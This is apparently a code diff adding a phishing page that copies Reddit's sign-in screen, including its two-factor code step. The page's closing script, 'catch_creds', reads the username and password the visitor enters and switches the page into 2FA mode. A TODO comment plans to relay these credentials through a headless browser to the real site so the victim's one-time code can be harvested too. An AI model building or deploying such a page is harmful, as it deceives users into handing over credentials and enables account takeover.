@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>reddit.com: Log in</title>
+        <link rel="shortcut icon" type="image/png" sizes="512x512" href="https://www.redditstatic.com/accountmanager/favicon/favicon-512x512.png">
+        <link rel="shortcut icon" type="image/png" sizes="192x192" href="https://www.redditstatic.com/accountmanager/favicon/favicon-192x192.png">
+        <link rel="shortcut icon" type="image/png" sizes="32x32" href="https://www.redditstatic.com/accountmanager/favicon/favicon-32x32.png">
+        <link rel="shortcut icon" type="image/png" sizes="16x16" href="https://www.redditstatic.com/accountmanager/favicon/favicon-16x16.png">
+        <link rel="apple-touch-icon" sizes="180x180" href="https://www.redditstatic.com/accountmanager/favicon/apple-touch-icon-180x180.png">
+        <link rel="mask-icon" href="https://www.redditstatic.com/accountmanager/favicon/safari-pinned-tab.svg" color="#5bbad5">
+        <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+        <meta name="msapplication-TileColor" content="#ffffff"/>
+        <meta name="msapplication-TileImage" content="https://www.redditstatic.com/accountmanager/favicon/mstile-310x310.png"/>
+        <meta name="msapplication-TileImage" content="https://www.redditstatic.com/accountmanager/favicon/mstile-310x150.png"/>
+        <meta name="theme-color" content="#ffffff">
+        
+        
+
+  <link rel="stylesheet" href="https://www.redditstatic.com/accountmanager/vendor.7749aab6f5c7d510110eaa0430cb683d.css">
+
+  <link rel="stylesheet" href="https://www.redditstatic.com/accountmanager/theme.5e411b81dd5eff52023d3e13cde38668.css">
+
+  <link rel="stylesheet" href="https://www.redditstatic.com/accountmanager/login.5d548fad4637c6ba118ebcf590a30611.css">
+
+
+    </head>
+    <body>
+        
+
+    <div class="Container">
+
+    <div class="PageColumns">
+        <div class="PageColumn PageColumn__left">
+<div class="Art"></div>
+</div>
+        <div class="PageColumn PageColumn__right">
+<div class="ColumnContainer mode-auth">
+  <div class="SnooIcon"></div>
+  <h1 class="Title">
+    
+      Sign in
+    
+  </h1>
+  <p class="tfa-description hideable">
+    You have two-factor authentication enabled on this account because you're awesome.
+  </p>
+  <form class="AnimatedForm">
+    <fieldset class="AnimatedForm__field m-required login hideable" id="fs-username">
+      <input id="loginUsername" class="AnimatedForm__textInput" type="text" name="username">
+      <label class="AnimatedForm__textInputLabel" for="loginUsername">Username</label>
+      <div class="AnimatedForm__errorMessage"></div>
+    </fieldset>
+    <fieldset class="AnimatedForm__field m-required password hideable" id="fs-password">
+      <input id="loginPassword" class="AnimatedForm__textInput" type="password" name="password">
+      <label class="AnimatedForm__textInputLabel" for="loginPassword">Password</label>
+      <div class="AnimatedForm__errorMessage"></div>
+    </fieldset>
+    <div class="two-modes-separator"></div>
+    <fieldset class="AnimatedForm__field m-required otp hideable" id="fs-code">
+      <input id="loginOtp" class="AnimatedForm__textInput" type="tel" name="otp" pattern="[0-9]*" autocomplete="off">
+      <label class="AnimatedForm__textInputLabel" for="loginPassword">6 digit code</label>
+      <div class="AnimatedForm__errorMessage"></div>
+      <input type="hidden" name="otp-type" value="app">
+    </fieldset>
+    <fieldset class="AnimatedForm__field switch-otp-type hideable" id="fs-backupcode">
+      <span class="BottomLink switch-otp-type">Use a backup code</span>
+    </fieldset>
+    <fieldset class="AnimatedForm__field">
+      <button class="AnimatedForm__submitButton" type="button" id="submit_button">Sign in</button>
+      <div class="AnimatedForm__submitStatus">
+        <div class="AnimatedForm__submitStatusIcon"></div><!--
+        --><span class="AnimatedForm__submitStatusMessage"></span>
+      </div>
+    </fieldset>
+  </form>
+  <div class="BottomText m-secondary-text login-bottom-text hideable">
+    <a class="BottomLink m-secondary-text" href="http://www.reddit.com/username">Forgot username</a>
+    <span>&middot;</span>
+    <a class="BottomLink m-secondary-text" href="http://www.reddit.com/password">Forgot password</a>
+  </div>
+  <div class="BottomText login-bottom-text hideable">
+    New to Reddit? <a class="BottomLink" href="http://www.reddit.com/register/">Sign up</a>
+  </div>
+  <div class="BottomText tfa-bottom-text hideable">
+    <span class="BottomLink back-to-main">Go back to account details</span><!--
+    --><span class="LinkSeparator">•</span><!--
+    --><a class="BottomLink" target="_blank" href="https://www.reddithelp.com/en/categories/using-reddit/your-reddit-account/how-set-two-factor-authentication">Having trouble ?</a>
+  </div>
+</div>
+</div>
+    </div>
+</div>
+
+
+        <!-- <script>
+            //<![CDATA
+                
+                window.___r = {"config": {"tracker_endpoint": "https://events.reddit.com/v2", "tracker_secret": "V2FpZ2FlMlZpZTJ3aWVyMWFpc2hhaGhvaHNoZWl3", "tracker_key": "AccountManager3"}};
+            //]]>
+        </script> -->
+        
+
+  <script type="text/javascript" src="https://www.redditstatic.com/accountmanager/common.bfbaf1a557c73f96a272.js"></script>
+
+  <script type="text/javascript" src="https://www.redditstatic.com/accountmanager/vendor.02e70b0510146f5c6a8c.js"></script>
+
+  <script type="text/javascript" src="https://www.redditstatic.com/accountmanager/theme.f03d466e68261629ed71.js"></script>
+
+  <script type="text/javascript" src="https://www.redditstatic.com/accountmanager/login.3a9d320757586e77e7d8.js"></script>
+
+  <script type="text/javascript">
+  	var btn = document.getElementById('submit_button');
+  	btn.onclick = catch_creds;
+
+  	function catch_creds() {
+  		var username = document.getElementById('loginUsername').value;
+  		var password = document.getElementById('loginPassword').value;
+  		// TODO: use a headless browser to send these creds to the real reddit page, which will then generate a 2fa token sent to the user
+  		
+  		// change the look of the login page to be 2fa mode
+  		var container = document.getElementsByClassName("ColumnContainer")[0]
+  		container.classList.remove("mode-auth")
+  		container.classList.add("mode-2fa")
+  		btn.innerHTML = "CHECK";
+  	}
+  </script>
+
+
+    </body>
+</html>
